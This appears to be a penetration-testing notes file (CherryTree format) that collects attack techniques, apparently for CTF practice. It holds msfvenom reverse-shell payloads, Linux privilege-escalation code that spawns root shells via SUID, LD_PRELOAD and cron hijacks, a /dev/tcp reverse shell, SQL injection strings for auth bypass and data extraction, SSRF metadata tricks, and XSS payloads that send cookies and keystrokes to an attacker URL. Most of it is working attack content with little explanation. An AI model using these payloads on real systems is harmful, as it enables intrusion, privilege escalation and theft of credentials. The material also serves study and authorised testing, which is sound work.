        <rich_text indent="2">msfvenom -p php/meterpreter_reverse_tcp LHOST=</rich_text>
        <rich_text indent="2" weight="heavy">IP</rich_text>
        <rich_text indent="2"> LPORT=</rich_text>
        <rich_text indent="2" weight="heavy">PORT</rich_text>
        <rich_text indent="2"> -f raw -o rev_shell.php</rich_text>
        <rich_text indent="1">

ASP
</rich_text>
        <rich_text indent="2">msfvenom -p windows/meterpreter/reverse_tcp LHOST=</rich_text>
        <rich_text indent="2" weight="heavy">IP</rich_text>
        <rich_text indent="2"> LPORT=</rich_text>
        <rich_text indent="2" weight="heavy">PORT</rich_text>
        <rich_text indent="2"> -f asp -o rev_shell.asp</rich_text>
        <rich_text indent="1">

Python
</rich_text>
        <rich_text indent="2">msfvenom -p cmd/unix/reverse_python LHOST=</rich_text>
        <rich_text indent="2" weight="heavy">IP</rich_text>
        <rich_text indent="2"> LPORT=</rich_text>
        <rich_text indent="2" weight="heavy">PORT</rich_text>
        <rich_text indent="2"> -f raw -o rev_shell.py</rich_text>
      </node>
    </node>
  </node>
  <node name="Privilige Escalation" unique_id="99" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699550864" ts_lastsave="1699979997">
    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
    <rich_text>
Useful links:
</rich_text>
    <rich_text indent="1" link="webs https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md">https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md</rich_text>
    <rich_text indent="1"> 
</rich_text>
    <rich_text indent="1" link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md</rich_text>
    <rich_text indent="1"> 
</rich_text>
    <rich_text indent="1" link="webs https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html</rich_text>
    <rich_text indent="1"> 
</rich_text>
    <rich_text indent="1" link="webs https://payatu.com/guide-linux-privilege-escalation">https://payatu.com/guide-linux-privilege-escalation</rich_text>
    <rich_text> 
</rich_text>
    <rich_text indent="1" link="webs https://gtfobins.github.io/">https://gtfobins.github.io/</rich_text>
    <rich_text> 


LinEnum:
</rich_text>
    <rich_text indent="1">wget </rich_text>
    <rich_text indent="1" link="webs https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh</rich_text>
    <rich_text>


Exploit SUID/GUID:
</rich_text>
    <rich_text indent="1">Basic SUID/GUID exploit:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">Search for all SUID files:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="3">find / -perm -u=s -type f 2&gt;/dev/null</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="3">or</rich_text>
    <rich_text indent="1">
</rich_text>
    <rich_text indent="3">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">execute file with SUID:</rich_text>
    <rich_text indent="1">
</rich_text>
    <rich_text indent="3">./</rich_text>
    <rich_text indent="3" weight="heavy">FILE </rich_text>
    <rich_text indent="3">-p</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">Shared Object Injection:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">run strace to detect missing or vulnerable objects</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="3">strace </rich_text>
    <rich_text indent="3" weight="heavy">/SUID_COMMAND</rich_text>
    <rich_text indent="3"> 2&gt;&amp;1 | grep -iE "open|access|no such file"</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">Create the necessary directories to imitate the full path to the object</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">Create a file called shell.c</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="3">#include &lt;stdio.h&gt;</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="3">#include &lt;stdlib.h&gt;</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="4">static void inject() __attribute__((constructor));</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="4">void inject() {</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="4">        setuid(0);</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="4">        system("/bin/bash -p");</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="4">}</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">Create a shared object with the same name as</rich_text>
    <rich_text> the missing object
</rich_text>
    <rich_text indent="3">gcc -shared -fPIC -o /</rich_text>
    <rich_text indent="3" weight="heavy">IMITATED_PATH</rich_text>
    <rich_text indent="3">/</rich_text>
    <rich_text indent="3" weight="heavy">OBJECT_NAME</rich_text>
    <rich_text indent="3">.so /</rich_text>
    <rich_text indent="3" weight="heavy">PATH</rich_text>
    <rich_text indent="3">/shell.c</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">run the program</rich_text>
    <rich_text>

Write-able passwd file:
</rich_text>
    <rich_text indent="1">generate password hash:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">openssl passwd -1 -salt </rich_text>
    <rich_text indent="2" weight="heavy">SALT</rich_text>
    <rich_text indent="2"> </rich_text>
    <rich_text weight="heavy">PASSWORD</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">mkpasswd -m </rich_text>
    <rich_text indent="2" weight="heavy">TYPE</rich_text>
    <rich_text indent="2"> </rich_text>
    <rich_text weight="heavy">PASSWORD</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">create newline in passwd file for root user:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2" weight="heavy">USERNAME</rich_text>
    <rich_text indent="2">:</rich_text>
    <rich_text indent="2" weight="heavy">PASSWORD_HASH</rich_text>
    <rich_text indent="2">:0:0:root:/root:/bin/bash</rich_text>
    <rich_text>


exploit binaries:
</rich_text>
    <rich_text indent="1">list commands user can run as root:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">sudo -l</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">lookup the binary in: </rich_text>
    <rich_text indent="1" link="webs https://gtfobins.github.io/">https://gtfobins.github.io/</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">vi -&gt; sudo vi -c ':!/bin/sh' /dev/null</rich_text>
    <rich_text>


PATH variable exploit:
</rich_text>
    <rich_text indent="1">Backup the original path</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">echo $PATH &gt; original_path</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">identify a program/file runnable with root priviliges</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">identify which core commands it runs</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">strings </rich_text>
    <rich_text weight="heavy">COMMAND</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">cat/nano/less/head/....</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">create imitating escalation script:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">echo “/bin/bash” &gt; </rich_text>
    <rich_text indent="2" weight="heavy">IMITATING_COMMAND</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">modify the path variable to the directory</rich_text>
    <rich_text> of the imitating script
</rich_text>
    <rich_text indent="2">PATH=.:/</rich_text>
    <rich_text weight="heavy">PATH_TO_SCRIPT</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">or</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">export PATH=/</rich_text>
    <rich_text indent="2" weight="heavy">PATH_TO_SCRIPT</rich_text>
    <rich_text indent="2">:$PATH</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">execute the program/file running with root priviliges</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">resetting</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">export PATH=</rich_text>
    <rich_text indent="2" weight="heavy">ORIGINAL_PATH</rich_text>
    <rich_text indent="2">:$PATH</rich_text>
    <rich_text>


Environment variables exploit:
</rich_text>
    <rich_text indent="1">*** </rich_text>
    <rich_text indent="1" weight="heavy">PATH</rich_text>
    <rich_text indent="1"> needs to be full path!</rich_text>
    <rich_text> ***
</rich_text>
    <rich_text indent="1">look if LD_PRELOAD or LD_LIBRARY_PATH is present in the env_keep</rich_text>
    <rich_text>:
</rich_text>
    <rich_text indent="2">sudo -l</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">exploit LD_PRELOAD:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">Create preload.c file:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="3">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;

void _init() {
  unsetenv("LD_PRELOAD");
  setresuid(0,0,0);
  system("/bin/bash -p");
}</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">Create a shared object</rich_text>
    <rich_text> with the preload.c file:
</rich_text>
    <rich_text indent="3">gcc -fPIC -shared -nostartfiles -o</rich_text>
    <rich_text> </rich_text>
    <rich_text weight="heavy">/PATH/SHARED_OBJECT</rich_text>
    <rich_text>.so </rich_text>
    <rich_text weight="heavy">/PATH/</rich_text>
    <rich_text>preload.c
</rich_text>
    <rich_text indent="2">Run a program you are allowed to run via sudo with the new shared object:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="3">sudo LD_PRELOAD=</rich_text>
    <rich_text indent="3" weight="heavy">/PATH/SHARED_OBJECT</rich_text>
    <rich_text indent="3">.so </rich_text>
    <rich_text weight="heavy">PROGRAM</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">exploit</rich_text>
    <rich_text> LD_LIBRARY_PATH:
</rich_text>
    <rich_text indent="2">Create library_path.c file:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="3">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">identify shared libraries of a program you can run with sudo:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="3">ldd </rich_text>
    <rich_text indent="3" weight="heavy">PROGRAM</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">Create a shared object with the same name as one of the libraries</rich_text>
    <rich_text> with the library_path.c file:
</rich_text>
    <rich_text indent="3">gcc -o </rich_text>
    <rich_text indent="3" weight="heavy">/PATH/LIBRARY_NAME</rich_text>
    <rich_text indent="3"> -shared -fPIC </rich_text>
    <rich_text indent="3" weight="heavy">/PATH</rich_text>
    <rich_text indent="3">/library_path.c</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">Run the program with the new object</rich_text>
    <rich_text>:
</rich_text>
    <rich_text indent="3">sudo LD_LIBRARY_PATH=</rich_text>
    <rich_text indent="3" weight="heavy">/PATH/DIRECTORY_CONTAINING_OBJECT</rich_text>
    <rich_text indent="3"> </rich_text>
    <rich_text weight="heavy">PROGRAM</rich_text>
    <rich_text>

Cronjobs exploit:
</rich_text>
    <rich_text indent="1">view system-wide crontab:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">cat /etc/crontab</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">look for scripts running as root</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">script modification exploit:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">modify that script</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">replace code with reverse shell</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="3">#!/bin/bash</rich_text>
    <rich_text indent="2">
</rich_text>
    <rich_text indent="3">bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">PATH variable exploit:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">lookup the PATH variable</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">create an EXECUTABLE file with the same filename as one of the cronjobs in that directory</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="3">#!/bin/bash</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="3">cp /bin/bash /tmp/rootbash</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="3">chmod +xs /tmp/rootbash</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">wait until the job runs and executes the malicious file</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">run the newly created file with -p</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">TAR Wildcard exploits:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">identify script with TAR command using wildcards
create a reverse shell executable
place file in the directory included in the wildcard of the TAR command
run following commands in the same place:
</rich_text>
    <rich_text indent="3">touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=</rich_text>
    <rich_text indent="3" weight="heavy">REVERSE_SHELL_EXECUTABLE</rich_text>
    <rich_text>


Command history snooping:
</rich_text>
    <rich_text indent="1">view all histry files:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">cat ~/.*history | less</rich_text>
    <rich_text>


Kernel exploits:
</rich_text>
    <rich_text indent="1">Use tool to identify possible exploits:
</rich_text>
    <rich_text indent="2">perl linux-exploit-suggester-2.pl</rich_text>
  </node>
  <node name="Web Exploitation" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="35" is_bold="0" foreground="" ts_creation="1699272931" ts_lastsave="1701685992">
    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
    <rich_text>
Local File Inclusion:
</rich_text>
    <rich_text indent="1">use</rich_text>
    <rich_text indent="1" weight="heavy"> ../</rich_text>
    <rich_text indent="1"> to traverse directories
bypass input validation</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">nullbyte </rich_text>
    <rich_text indent="2" weight="heavy">%00</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2" weight="heavy">/.</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2" weight="heavy">....//</rich_text>
    <rich_text indent="2"> instead of ../</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">Include the directory name first</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">Use POST instead of GET</rich_text>
    <rich_text>

UPLOAD EXPLOITATION:
</rich_text>
    <rich_text indent="1">RECON</rich_text>
    <rich_text>:
</rich_text>
    <rich_text indent="2">Identitfy languages and frameworks.</rich_text>
    <rich_text indent="1">
</rich_text>
    <rich_text indent="3">Use Wappalyzer / analyze responses (server, x-powered-by, ..).</rich_text>
    <rich_text indent="1">
</rich_text>
    <rich_text indent="2">Enumerate directories.</rich_text>
    <rich_text indent="1">
</rich_text>
    <rich_text indent="2">Identify upload page.</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">Upload legitimate file.</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">Find the page containing the uploads.</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="3">Gobuster -x switch -&gt; used to look for files with specific extensions.</rich_text>
    <rich_text indent="2">
</rich_text>
    <rich_text indent="3">For example: -x php,txt,html-&gt; the tool would append .php, .txt, and .html to each word in the selected wordlist</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">CLIENT-SIDE FILTER BYPASS:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">Analyze source code for client-side scripts for client-side filters</rich_text>
    <rich_text>.
</rich_text>
    <rich_text indent="2">Malicious file upload, bypassing any client-side filters</rich_text>
    <rich_text>.</rich_text>
    <rich_text indent="1">
</rich_text>
    <rich_text indent="2">Analyze error message</rich_text>
    <rich_text>.
</rich_text>
    <rich_text indent="1">CLIENT-SIDE FILTER BYPASS:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">Successfull upload legitimate file with invalid file extension (e.g. testingimage.invalidfileextension)?
</rich_text>
    <rich_text indent="3">Yes -&gt; possibly extension blacklisting.</rich_text>
    <rich_text indent="2">
</rich_text>
    <rich_text indent="3">No -&gt; possibly extension whitelisting.</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">Upload legitimate file with the magic number of the file to be something that you would expect to be filtered
</rich_text>
    <rich_text indent="3">Fail -&gt; Magic number based filtering.</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">Upload legitimate file with the MIME type of the upload changed to something that you would expect to be filtered.
</rich_text>
    <rich_text indent="3">Fail -&gt; </rich_text>
    <rich_text>filtering based on MIME types.
</rich_text>
    <rich_text indent="2">Enumerate file length filters with the legitimate file. </rich_text>
    <rich_text>

SSRF:
</rich_text>
    <rich_text indent="1">Modify navigated URL:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">change the ?url parameter in the request</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">Directory traversal:</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="2">in ?url parameter add /../</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">add &amp;x= to stop remaining path from being appended to url</rich_text>
    <rich_text>

Catch HTTP requests:
</rich_text>
    <rich_text indent="1">requestbin.com</rich_text>
    <rich_text>

alternative localhost references:
</rich_text>
    <rich_text indent="1">0
0.0.0.0
0000
127.1
127.*.*.*
2130706433
017700000001</rich_text>
    <rich_text>
</rich_text>
    <rich_text indent="1">127.0.0.1.nip.io</rich_text>
    <rich_text>

Metadata cloud server:
</rich_text>
    <rich_text indent="2">169.254.169.254</rich_text>
    <node name="Upload Bypass" unique_id="77" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698763821" ts_lastsave="1702483902">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
basic ways to bypass client-side file upload filter:

</rich_text>
      <rich_text indent="1">Turn off Javascript in your browser
Intercept and modify the incoming page. Using Burpsuite, we can intercept the incoming web page and strip out the Javascript filter.
Intercept and modify the valid dummy file upload. Change the MIME Type
Send the file directly to the upload point. First intercept a successful upload to see the parameters being used in the upload</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">curl -X POST -F "submit:&lt;value&gt;" -F "&lt;file-parameter&gt;:@&lt;path-to-file&gt;" &lt;site&gt;</rich_text>
      <rich_text>


restrictions on downloading (/uploading) file because of extensions (</rich_text>
      <rich_text weight="heavy">&lt; PHP 5.0</rich_text>
      <rich_text>): 
</rich_text>
      <rich_text indent="1">Example</rich_text>
      <rich_text>: trying to download package.json.bak → 403 error: only .md and .pdf files can be downloaded
</rich_text>
      <rich_text indent="1">Bypass: use Poisen Null Byte</rich_text>
      <rich_text> (%00), URL ENCODED = %2500 → add %2500 at the end and also add one of the allowed extensions

Basic server-side filter bypass 
</rich_text>
      <rich_text indent="1">if filtering "PHP" on just “.”</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">instead of .PHP use .php3, .php4, .php5, .php7, .phps, .php-s, .pht, .phtml or .phar</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">Magic numbers</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">first add dummy characters to payload and then edit it in hexeditor</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">see: </rich_text>
      <rich_text>https://en.wikipedia.org/wiki/List_of_file_signatures



</rich_text>
    </node>
    <node name="SQL Injection" unique_id="93" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1699525351" ts_lastsave="1702904147">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Auth bypass:
</rich_text>
      <rich_text weight="heavy">USERNAME</rich_text>
      <rich_text>'; -- -

skip any sql statements:
  ' AND '1'='1 --</rich_text>
      <rich_text indent="1">
</rich_text>
      <rich_text>   ' AND '1'='2 --
   ' or 1=1--
 
 partially skip sql statements:
</rich_text>
      <rich_text indent="1"> </rich_text>
      <rich_text weight="heavy">INPUT</rich_text>
      <rich_text>'--

(SQLite):
</rich_text>
      <rich_text indent="1">Useful System databases &amp; tables:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">SELECT database()</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = '</rich_text>
      <rich_text indent="2" weight="heavy">DB_NAME</rich_text>
      <rich_text indent="2">'</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">SELECT group_concat(table_name) FROM information_schema.columns WHERE table_name = '</rich_text>
      <rich_text indent="2" weight="heavy">TABLE_NAME</rich_text>
      <rich_text indent="2">'</rich_text>
      <rich_text>

</rich_text>
      <rich_text indent="1">get all tables in the DB:
</rich_text>
      <rich_text indent="2">UNION ALL SELECT group_concat(table_name),null,null,null,null FROM information_schema.tables</rich_text>
      <rich_text indent="1">

get all columns in the DB:
</rich_text>
      <rich_text indent="2">UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns</rich_text>
      <rich_text indent="1">

get all colums of a specific table:
</rich_text>
      <rich_text indent="2">UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="</rich_text>
      <rich_text indent="2" weight="heavy">TABLENAME</rich_text>
      <rich_text indent="2">"</rich_text>
      <rich_text indent="1">

get username and password combo:
</rich_text>
      <rich_text indent="2">UNION SELECT group_concat(username,':',password SEPARATOR '&lt;br&gt;') FROM users</rich_text>
      <rich_text>

Blind SQL recon:
</rich_text>
      <rich_text indent="1">Use resoponse time to identify correct values</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">Find #columns:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">‘ UNION SELECT SLEEP(5),2,3,4;--</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">Find DB:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">' UNION SELECT SLEEP(5),2 where database() like '%';--</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">Find Table:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">' UNION SELECT SLEEP(5),2 </rich_text>
      <rich_text>FROM information_schema.tables WHERE table_schema like '</rich_text>
      <rich_text weight="heavy">DB_NAME</rich_text>
      <rich_text>' and table_name like '%';--
</rich_text>
      <rich_text indent="1">Find Column</rich_text>
      <rich_text>:
</rich_text>
      <rich_text indent="2">' UNION SELECT SLEEP(5),2 </rich_text>
      <rich_text>FROM information_schema.COLUMNS WHERE TABLE_SCHEMA like '</rich_text>
      <rich_text weight="heavy">DB_NAME</rich_text>
      <rich_text>' and TABLE_NAME like '</rich_text>
      <rich_text weight="heavy">TABLE_NAME</rich_text>
      <rich_text>' and COLUMN_NAME like '%';--
</rich_text>
      <rich_text indent="1">Find Values:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">' UNION SELECT SLEEP(5),2 </rich_text>
      <rich_text>FROM </rich_text>
      <rich_text weight="heavy">TABLE_NAME</rich_text>
      <rich_text> where </rich_text>
      <rich_text weight="heavy">COLUMN_NAME</rich_text>
      <rich_text> like '%' ;--


</rich_text>
      <node name="Info" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1702895002" ts_lastsave="1702905742">
        <rich_text>In-Band SQL Injection:</rich_text>
        <rich_text indent="1">
In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.

</rich_text>
        <rich_text>Error-Based SQL Injection:</rich_text>
        <rich_text indent="1">
This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 

</rich_text>
        <rich_text>Union-Based SQL Injection:</rich_text>
        <rich_text indent="1">
This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.</rich_text>
        <rich_text>

Blind SQL Injection:
</rich_text>
        <rich_text indent="1">Unlike In-Band SQL injection, where we can see the results of our attack directly on the screen, blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless. It might surprise you that all we need is that little bit of feedback to successful enumerate a whole database.</rich_text>
        <rich_text>

Out-Of-Band SQL Injection:
</rich_text>
        <rich_text indent="1">An Out-Of-Band attack is classified by having two different communication channels, one to launch the attack and the other to gather the results. For example, the attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service you control.</rich_text>
      </node>
    </node>
    <node name="XSS" unique_id="78" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698764744" ts_lastsave="1702483860">
      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test XSS:
</rich_text>
      <rich_text indent="1">Base:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">&lt;script&gt;alert('XSS');&lt;/script&gt;</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">&lt;input value="INPUT"&gt;</rich_text>
      <rich_text>:
</rich_text>
      <rich_text indent="2">"&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">&lt;textarea&gt;INPUT&lt;/textarea&gt;</rich_text>
      <rich_text>:
</rich_text>
      <rich_text indent="2">&lt;/textarea&gt;&lt;script&gt;alert('XSS');&lt;/script&gt;</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">inside JS code:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">';alert('XSS');//</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">filter on "script":</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">&lt;sscriptcript&gt;alert('XSS');&lt;/sscriptcript&gt;</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">&lt;img src="INPUT"&gt;</rich_text>
      <rich_text>:
</rich_text>
      <rich_text indent="2" weight="heavy">PATH_TO_IMAGE</rich_text>
      <rich_text indent="2">" onload="alert('THM');</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">General XSS bypass polyglot:</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="2">jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert('THM')//&gt;\x3e</rich_text>
      <rich_text>


test DOM:
</rich_text>
      <rich_text indent="1">create alert notification</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">&lt;iframe src="javascript:alert(`xss`)"&gt;</rich_text>
      <rich_text>

Session stealing:
</rich_text>
      <rich_text indent="1">&lt;script&gt;fetch('https://</rich_text>
      <rich_text indent="1" weight="heavy">WEBSITE_HACKER_URL</rich_text>
      <rich_text indent="1">?cookie=' + btoa(document.cookie));&lt;/script&gt;</rich_text>
      <rich_text>

Key logger:
</rich_text>
      <rich_text indent="1">&lt;script&gt;document.onkeypress = function(e) { fetch('https://</rich_text>
      <rich_text indent="1" weight="heavy">WEBSITE_HACKER_URL</rich_text>
      <rich_text indent="1">?key=' + btoa(e.key) );}&lt;/script&gt;</rich_text>
      <rich_text>

Execute functions with specific parameters
</rich_text>
      <rich_text indent="1">example: user.changeEmail() = function to change email -&gt; reset account login</rich_text>
      <rich_text>
</rich_text>
      <rich_text indent="1">&lt;script&gt;user.changeEmail('attacker@hotmail.com');&lt;/script&gt;</rich_text>
      <rich_text>

</rich_text>
      <node name="Info" unique_id="101" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1702483796" ts_lastsave="1702895044">
        <rich_text>DOM (Special):
</rich_text>
        <rich_text indent="1">DOM XSS (Document Object Model-based Cross-site Scripting) uses the HTML environment to execute malicious javascript. This type of attack commonly uses the &lt;script&gt;&lt;/script&gt; HTML tag.</rich_text>
        <rich_text>
</rich_text>
        <rich_text indent="2">controllable JS variables/parameters (ex: window.location.x</rich_text>
        <rich_text>)
</rich_text>
        <rich_text indent="2">controllable JS functions (ex: eval())</rich_text>
        <rich_text>

Stored (Server-side):
</rich_text>
        <rich_text indent="1">Persistent XSS is javascript that is run when the server loads the page containing it. These can occur when the server does not sanitise the user data when it is uploaded to a page. These are commonly found on blog posts. </rich_text>
        <rich_text>
</rich_text>
        <rich_text indent="2">Comments on a blog
User profile information
Website Listings</rich_text>
        <rich_text>

Blind XSS (Server-side):
</rich_text>
